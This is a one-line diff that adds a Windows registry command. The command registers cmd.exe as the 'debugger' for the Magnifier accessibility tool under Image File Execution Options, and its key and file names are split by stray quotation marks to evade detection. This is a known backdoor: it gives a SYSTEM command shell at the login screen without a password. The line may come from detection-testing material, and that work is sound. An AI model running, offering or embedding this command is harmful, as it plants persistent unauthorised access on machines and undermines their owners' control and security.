@@ -1,0 +1,1 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\I"mag"e File Execution Options\mag"ni"fy.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
